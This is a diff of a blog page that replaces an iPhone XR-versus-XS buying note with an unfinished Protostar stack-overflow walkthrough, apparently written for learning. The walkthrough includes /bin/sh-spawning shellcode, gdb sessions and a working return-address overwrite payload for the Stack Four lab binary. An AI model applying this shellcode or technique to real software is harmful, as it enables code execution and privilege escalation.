@@ -1,24 +1,24 @@
 <!DOCTYPE html>
 <html lang="en-us">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='毕竟 6S 实在不忍心继续压榨它了x'><title>关于 2021 年捡垃圾是选 XR 还是 XS 的笔记</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='大概只是作为学习的时候的一点点笔记'><title>[unfinished] Protostar Stack 0-7 Walkthrough</title>
 
-<link rel='canonical' href='/p/2021-ip-xr-or-xs/'>
+<link rel='canonical' href='/p/protostar_stack_4-7/'>
 
-<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='关于 2021 年捡垃圾是选 XR 还是 XS 的笔记'>
-<meta property='og:description' content='毕竟 6S 实在不忍心继续压榨它了x'>
-<meta property='og:url' content='/p/2021-ip-xr-or-xs/'>
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='[unfinished] Protostar Stack 0-7 Walkthrough'>
+<meta property='og:description' content='大概只是作为学习的时候的一点点笔记'>
+<meta property='og:url' content='/p/protostar_stack_4-7/'>
 <meta property='og:site_name' content='Senri&#39;s Memo'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2021-07-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-07-27T00:00:00&#43;00:00'/><meta property='og:image' content='/' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2022-03-22T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-03-22T00:00:00&#43;00:00'/><meta property='og:image' content='/p/protostar_stack_4-7/cover.png' />
 <meta name="twitter:site" content="@KurusuSenri">
-    <meta name="twitter:creator" content="@KurusuSenri"><meta name="twitter:title" content="关于 2021 年捡垃圾是选 XR 还是 XS 的笔记">
-<meta name="twitter:description" content="毕竟 6S 实在不忍心继续压榨它了x"><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='/' />
+    <meta name="twitter:creator" content="@KurusuSenri"><meta name="twitter:title" content="[unfinished] Protostar Stack 0-7 Walkthrough">
+<meta name="twitter:description" content="大概只是作为学习的时候的一点点笔记"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='/p/protostar_stack_4-7/cover.png' />
     <link rel="shortcut icon" href="favicon.ico" />
 
     </head>
     <body class="
-    article-page 
+    article-page has-toc
 ">
     <script>
         (function() {
@@ -42,183 +42,57 @@
 </script>
 <div class="container main-container flex 
     
-        on-phone--column compact
+        extended
     
 ">
     
-        <aside class="sidebar left-sidebar sticky">
-    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
-        <span class="hamburger-box">
-            <span class="hamburger-inner"></span>
-        </span>
-    </button>
-
-    <header class="site-info">
-        
-            
-            <figure class="site-avatar">
-                
-                    
-                    
-                    
-                        
-                        <img src="/img/senri_hu3d5cd76f3de7d1b2e16bf0ae6b13ddc2_394892_300x0_resize_q75_box.jpeg" width="300"
-                            height="300" class="site-logo" loading="lazy" alt="Avatar">
-                    
-                
-
-                
-                    <span class="emoji">🍥</span>
-                
-            </figure>
-            
-        
-        <h1 class="site-name"><a href="/">Kurusu Senri</a> </h1>
-        
-        <h2 class="site-description">既然一切表达都不尽如人意，那么最寻常的表达就足够了。</h2>
-    </header>
-
-    <ol class="menu" id="main-menu">
-        
-        
-        
-
-        <li >
-            <a href='/'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
-  <polyline points="5 12 3 12 12 3 21 12 19 12" />
-  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
-  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+  <polyline points="15 6 9 12 15 18" />
 </svg>
 
 
 
-                
-                <span>主页</span>
+                <span>返回</span>
             </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/archives/'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <rect x="3" y="4" width="18" height="4" rx="2" />
-  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
-  <line x1="10" y1="12" x2="14" y2="12" />
-</svg>
-
-
-
-                
-                <span>归档</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/guestbook/'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <path d="M21 14l-3 -3h-7a1 1 0 0 1 -1 -1v-6a1 1 0 0 1 1 -1h9a1 1 0 0 1 1 1v10" />
-  <path d="M14 15v2a1 1 0 0 1 -1 1h-7l-3 3v-10a1 1 0 0 1 1 -1h2" />
-</svg>
-
-
-
-                
-                <span>留言</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/links/'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
-  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
-</svg>
-
-
-
-                
-                <span>链接</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/p/about'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="7" r="4" />
-  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
-</svg>
-
-
-
-                
-                <span>关于</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/search/'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="10" cy="10" r="7" />
-  <line x1="21" y1="21" x2="15" y2="15" />
-</svg>
-
-
-
-                
-                <span>搜索</span>
-            </a>
-        </li>
-        
-
-        
-    </ol>
-</aside>
-
+        </div>
     
 <main class="main full-width">
-    <article class="main-article">
+    <article class="has-image main-article">
     <header class="article-header">
+        <div class="article-image">
+            <a href="/p/protostar_stack_4-7/">
+                <img src="/p/protostar_stack_4-7/cover_hu89b69cad7273891b1af867ec9c4a2eb7_439381_800x0_resize_box_3.png"
+                        srcset="/p/protostar_stack_4-7/cover_hu89b69cad7273891b1af867ec9c4a2eb7_439381_800x0_resize_box_3.png 800w, /p/protostar_stack_4-7/cover_hu89b69cad7273891b1af867ec9c4a2eb7_439381_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="258" 
+                        loading="lazy"
+                        alt="Featured image of post [unfinished] Protostar Stack 0-7 Walkthrough" />
+                
+            </a>
+        </div>
+    
 
     <div class="article-details">
     
     <header class="article-category">
         
-            <a href="/categories/catchrubbish/" >
-                CatchRubbish
+            <a href="/categories/binary/" >
+                Binary
             </a>
         
     </header>
     
 
     <h2 class="article-title">
-        <a href="/p/2021-ip-xr-or-xs/">关于 2021 年捡垃圾是选 XR 还是 XS 的笔记</a>
+        <a href="/p/protostar_stack_4-7/">[unfinished] Protostar Stack 0-7 Walkthrough</a>
     </h2>
 
     
     <h3 class="article-subtitle">
-        毕竟 6S 实在不忍心继续压榨它了x
+        大概只是作为学习的时候的一点点笔记
     </h3>
     
 
@@ -235,7 +109,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">Jul 27, 2021</time>
+                <time class="article-time--published">Mar 22, 2022</time>
             </div>
         
 
@@ -246,119 +120,632 @@
 </header>
 
     <section class="article-content">
-    <ol>
-<li>
-<p>还是选 iPhone 是因为咱是 iCloud 的重度用户而且和 Mac 结合非常方便</p>
-</li>
-<li>
-<p>因为只是「笔记」所以本文充满了我的偏见与独断x</p>
-</li>
-<li>
-<p>截止目前<code>2021.7.27</code>，同样是二手、国行、九新+、256G<br>
-XR 和 XS 的价格都在 2500 左右，<br>
-且 XR 会稍微便宜一点（也就在两三百左右</p>
-</li>
-</ol>
-<p>接下来记录一下自己查资料时的一些思路</p>
+    <h2 id="protostar">Protostar</h2>
+<p><a class="link" href="https://exploit.education/protostar/"  target="_blank" rel="noopener"
+    >☞ Protostar</a></p>
+<p>Protostar introduces the following in a friendly way:</p>
+<ul>
+<li>Network programming</li>
+<li>Byte order</li>
+<li>Handling sockets</li>
+<li>Stack overflows</li>
+<li>Format strings</li>
+<li>Heap overflows</li>
+<li>The above is introduced in a simple way, starting with simple memory corruption and modification, function redirection, and finally executing custom shellcode.</li>
+</ul>
+<p>In order to make this as easy as possible to introduce Address Space Layout Randomisation and Non-Executable memory has been disabled. If you are interested in covering ASLR and NX memory, please see the <a class="link" href="https://exploit.education/fusion/"  target="_blank" rel="noopener"
+    >Fusion</a> page.</p>
 <hr />
-<h1 id="外观--手感">外观 &amp; 手感</h1>
-<p>不得不说我感觉 XR 的单摄像头好好看啊啊啊啊</p>
-<p>而且花里胡哨的颜色</p>
-<p>但好像很多人对 XR 的边框很不满</p>
-<p>但我平常是看屏幕不是看边框啊喂，停航母边框又咋样、反正我也不戴tao——</p>
-<p>* 看了下自己背面全是坑正面玻璃全碎的 6S</p>
-<p>我觉得可能还是戴套比较好。</p>
-<p>顺便因为 XR 还挺厚，</p>
-<p>所以至少 XS 戴套的话正面无论看起来还是操作起来都会优于 XR 的吧</p>
-<p>（话说上一句话不应该是归类于<code>#屏幕</code>节么x</p>
+<h2 id="shell-storm">shell-storm</h2>
+<p><a class="link" href="http://shell-storm.org/shellcode/"  target="_blank" rel="noopener"
+    >☞ shell-storm</a></p>
+<p>有各种各样的 Shellcode</p>
+<p>比较常用的是<a class="link" href="http://shell-storm.org/shellcode/files/shellcode-219.php"  target="_blank" rel="noopener"
+    >这个</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * $Id: gets-linux.c,v 1.3 2004/06/02 12:22:30 raptor Exp $
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * gets-linux.c - stdin re-open shellcode for Linux/x86
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * Copyright (c) 2003 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * Local shellcode for stdin re-open and /bin/sh exec. It closes stdin 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * descriptor and re-opens /dev/tty, then does an execve() of /bin/sh.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * Useful to exploit some gets() buffer overflows in an elegant way...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> sc[] <span style="color:#f92672">=</span> 
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x31\xdb\xb0\x06\xcd\x80</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x53\x68</span><span style="color:#e6db74">/tty</span><span style="color:#ae81ff">\x68</span><span style="color:#e6db74">/dev</span><span style="color:#ae81ff">\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x50\x68</span><span style="color:#e6db74">//sh</span><span style="color:#ae81ff">\x68</span><span style="color:#e6db74">/bin</span><span style="color:#ae81ff">\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80</span><span style="color:#e6db74">&#34;</span>;
+</span></span></code></pre></div><hr />
+<h2 id="乱七八糟的笔记">乱七八糟的笔记</h2>
+<table>
+<thead>
+<tr>
+<th>正常情况下在一个函数看来栈的布局</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><em>[higher memory]</em></td>
+</tr>
+<tr>
+<td>caller&rsquo;s frame</td>
+</tr>
+<tr>
+<td>argument passed by the caller</td>
+</tr>
+<tr>
+<td>return address</td>
+</tr>
+<tr>
+<td>saved ebp</td>
+</tr>
+<tr>
+<td>local variable 1 ☜ ebp</td>
+</tr>
+<tr>
+<td>local variable 2</td>
+</tr>
+<tr>
+<td>local variable 3 ☜ esp</td>
+</tr>
+<tr>
+<td><em>[lower memory]</em></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<p>关于 gdb 的 <code>x/</code> 命令用法：
+<code>x /[Length][Format] [Address expression]</code></p>
+<p>例：
+<code>x/24wx $esp</code>
+<code>x/2i $eip</code></p>
+<hr />
+<p><code>define hook-stop</code> 的用法：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>info registers
+</span></span><span style="display:flex;"><span>x/24wx $esp
+</span></span><span style="display:flex;"><span>x/2i $eip
+</span></span><span style="display:flex;"><span>end
+</span></span></code></pre></div><hr />
+<p>以及：</p>
+<pre tabindex="0"><code>(gdb) set disassembly-flavor intel
+</code></pre><hr />
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ls -al /opt/protostar/bin/ | grep stack
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">22412</span> Nov <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2011</span> stack0
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">23196</span> Nov <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2011</span> stack1
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">23350</span> Nov <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2011</span> stack2
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">23130</span> Nov <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2011</span> stack3
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">22860</span> Nov <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2011</span> stack4
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">22612</span> Nov <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2011</span> stack5
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">23331</span> Nov <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2011</span> stack6
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">23461</span> Nov <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2011</span> stack7
+</span></span></code></pre></div><hr />
+<h2 id="stack-zero--three">Stack Zero ~ Three</h2>
+<p><a class="link" href="/p/protostar_stack_0-3" >☞ 为了避免太长就被隐藏在这里了x</a></p>
+<hr />
+<h2 id="stack-four">Stack Four</h2>
 <blockquote>
-<p>所以对我来说的话，</p>
-<p>如果都戴套：</p>
-<p>手感：XS &gt; XR</p>
-<p>外观：半斤八两，虽然 XS 赢了正面但背面果然还是 XR 好看</p>
+<p>Stack4 takes a look at overwriting saved EIP and standard buffer overflows.</p>
+<p>This level is at /opt/protostar/bin/stack4</p>
+<p><strong>Hints</strong></p>
+<ul>
+<li>A variety of introductory papers into buffer overflows may help.</li>
+<li>gdb lets you do “run &lt; input”</li>
+<li>EIP is not directly after the end of buffer, compiler padding can also increase the size.</li>
+</ul>
 </blockquote>
-<hr />
-<h1 id="续航">续航</h1>
-<p>毕竟这个 6S 已经&hellip;2015 年发布到现在已经 6 年了所以电池实在是&hellip;</p>
-<p>XS 的续航嘛&hellip;</p>
-<p>不用说了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;code flow successfully changed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">64</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  gets(buffer);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><hr />
+<p>首先 <code>objdump</code> 找到 <code>void win()</code> 的地址</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@protostar:/opt/protostar/bin$ objdump -t /opt/protostar/bin/stack4 | grep win
+</span></span><span style="display:flex;"><span>080483f4 g     F .text	<span style="color:#ae81ff">00000014</span>              win
+</span></span></code></pre></div><p>然后，如何知道 <code>main()</code> 会返回到哪里呢&hellip;.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disassemble main
+</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
+</span></span><span style="display:flex;"><span>0x08048408 &lt;main+0&gt;:	push   %ebp
+</span></span><span style="display:flex;"><span>0x08048409 &lt;main+1&gt;:	mov    %esp,%ebp
+</span></span><span style="display:flex;"><span>0x0804840b &lt;main+3&gt;:	and    $0xfffffff0,%esp
+</span></span><span style="display:flex;"><span>0x0804840e &lt;main+6&gt;:	sub    $0x50,%esp
+</span></span><span style="display:flex;"><span>0x08048411 &lt;main+9&gt;:	lea    0x10<span style="color:#f92672">(</span>%esp<span style="color:#f92672">)</span>,%eax
+</span></span><span style="display:flex;"><span>0x08048415 &lt;main+13&gt;:	mov    %eax,<span style="color:#f92672">(</span>%esp<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>0x08048418 &lt;main+16&gt;:	call   0x804830c &lt;gets@plt&gt;
+</span></span><span style="display:flex;"><span>0x0804841d &lt;main+21&gt;:	leave  
+</span></span><span style="display:flex;"><span>0x0804841e &lt;main+22&gt;:	ret    
+</span></span><span style="display:flex;"><span>End of assembler dump.
+</span></span></code></pre></div><p>首先在 <code>0x0804841e &lt;main+22&gt;:	ret</code> 处设置断点</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> break *0x0804841e
+</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">1</span> at 0x804841e: file stack4/stack4.c, line 16.
+</span></span></code></pre></div><p>为了方便可以写一个字母表&hellip;就大概知道栈溢出到了什么地方..<del>总之就是为了方便x</del></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@protostar:/tmp$ more alb
+</span></span><span style="display:flex;"><span>AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV
+</span></span></code></pre></div><p>运行，并查看栈</p>
+<p>这里就 <code>x/24wx $esp</code> 好了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> run &lt; alb
+</span></span><span style="display:flex;"><span>Starting program: /opt/protostar/bin/stack4 &lt; alb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Breakpoint 1, 0x0804841e in main <span style="color:#f92672">(</span>argc<span style="color:#f92672">=</span>Cannot access memory at address 0x5353535b
+</span></span><span style="display:flex;"><span><span style="color:#f92672">)</span> at stack4/stack4.c:16
+</span></span><span style="display:flex;"><span>16	in stack4/stack4.c
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/24wx $esp 
+</span></span><span style="display:flex;"><span>0xbffff79c:	0x54545454	0x55555555	0x56565656	0xbffff800
+</span></span><span style="display:flex;"><span>0xbffff7ac:	0xb7fe1848	0xbffff800	0xffffffff	0xb7ffeff4
+</span></span><span style="display:flex;"><span>0xbffff7bc:	0x0804824b	0x00000001	0xbffff800	0xb7ff0626
+</span></span><span style="display:flex;"><span>0xbffff7cc:	0xb7fffab0	0xb7fe1b28	0xb7fd7ff4	0x00000000
+</span></span><span style="display:flex;"><span>0xbffff7dc:	0x00000000	0xbffff818	0xfc365215	0xd6616405
+</span></span><span style="display:flex;"><span>0xbffff7ec:	0x00000000	0x00000000	0x00000000	0x00000001
+</span></span></code></pre></div><p>可见现在栈最高处存着 <code>0x54545454</code>，而这就是 EIP 马上会取的 Return Address</p>
+<p>前进一步看看</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> si
+</span></span><span style="display:flex;"><span>Cannot access memory at address 0x53535357
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info registers
+</span></span><span style="display:flex;"><span>eax            0xbffff750	-1073744048
+</span></span><span style="display:flex;"><span>ecx            0xbffff750	-1073744048
+</span></span><span style="display:flex;"><span>edx            0xb7fd9334	-1208118476
+</span></span><span style="display:flex;"><span>ebx            0xb7fd7ff4	-1208123404
+</span></span><span style="display:flex;"><span>esp            0xbffff7a0	0xbffff7a0
+</span></span><span style="display:flex;"><span>ebp            0x53535353	0x53535353
+</span></span><span style="display:flex;"><span>esi            0x0	<span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>edi            0x0	<span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>eip            0x54545454	0x54545454
+</span></span><span style="display:flex;"><span>eflags         0x200246	<span style="color:#f92672">[</span> PF ZF IF ID <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>cs             0x73	<span style="color:#ae81ff">115</span>
+</span></span><span style="display:flex;"><span>ss             0x7b	<span style="color:#ae81ff">123</span>
+</span></span><span style="display:flex;"><span>ds             0x7b	<span style="color:#ae81ff">123</span>
+</span></span><span style="display:flex;"><span>es             0x7b	<span style="color:#ae81ff">123</span>
+</span></span><span style="display:flex;"><span>fs             0x0	<span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>gs             0x33	<span style="color:#ae81ff">51</span>
+</span></span></code></pre></div><p>看来确实是 <code>eip 0x54545454</code></p>
+<p>接下来只要把 <code>0x54545454</code> 改成 <code>void win()</code> 的地址即可</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@protostar:/tmp$ more stack4.py 
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS&#34;</span>
+</span></span><span style="display:flex;"><span>win <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;\xf4\x83\x04\x08&#34;</span>
+</span></span><span style="display:flex;"><span>print <span style="color:#f92672">(</span>padding + win<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>user@protostar:/tmp$ python stack4.py | /opt/protostar/bin/stack4
+</span></span><span style="display:flex;"><span>code flow successfully changed
+</span></span><span style="display:flex;"><span>Segmentation fault
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>user@protostar:/tmp$
+</span></span></code></pre></div><hr />
+<h2 id="stack-five">Stack Five</h2>
 <blockquote>
-<p>续航：XS &lt; XR</p>
+<p>Stack5 is a standard buffer overflow, this time introducing shellcode.</p>
+<p>This level is at /opt/protostar/bin/stack5</p>
+<p><strong>Hints</strong></p>
+<ul>
+<li>At this point in time, it might be easier to use someone elses shellcode</li>
+<li>If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger</li>
+<li>remove the int3s once your shellcode is done.</li>
+</ul>
 </blockquote>
-<hr />
-<h1 id="性能">性能</h1>
-<p>似乎我不是很关注手机的性能毕竟不太用手机玩游戏的</p>
-<p>但是觉得这也很有必要放进考虑里</p>
-<p>XS 的内存是 4GB，XR 与 X 一样是 3GB</p>
-<p>其实反正是墓碑后台所以估计在未来两年内（瞎猜的）除了 XR 可能偶尔杀杀后台以外其他地方几乎无区别</p>
-<p>顺便隔壁 SE 二代也是 3GB 内存来着</p>
-<p>话说是哪个啥比起头把闪存也叫做内存的</p>
-<p>现在说个「内存」都不知道在指 RAM 还是闪存kuso&hellip;</p>
-<hr />
-<p>另外两个都是 A12 处理器，但很重要的是，XS 是双层主板</p>
-<p>所以发热很——严重</p>
-<p>那</p>
-<blockquote>
-<p>发热严重 → 降频 &amp;&amp; 屏幕亮度降低 → 看起来和摸起来都很不舒服</p>
-</blockquote>
-<p>emm实在不知道怎么比</p>
-<p>或许因为我不算重度使用的人所以我还是考虑：</p>
-<blockquote>
-<p>RAM 更大 → 可以撑更多年</p>
-<p>XS &gt; XR</p>
-</blockquote>
-<hr />
-<h1 id="摄影">摄影</h1>
-<p>原谅我用了「摄影」而不是「拍照」、因为只是觉得前者好听x</p>
-<p>XR 的主摄 和 XS 的其实是一个</p>
-<p>XS 多的那个长焦镜头&hellip;至少它有</p>
-<p>「人像模式」也就是模拟景深的这部分</p>
-<p>XR 虽然可以靠算法识别出人把人给抠出来，</p>
-<p>但是它只能识别人（草</p>
-<p>XS 的话是利用到了那个长焦镜头所以其他一些东西也可以模拟景深（虽然效果并不好</p>
-<p>但是本着有总比没有强x</p>
-<blockquote>
-<p>摄像：XR &gt; XS</p>
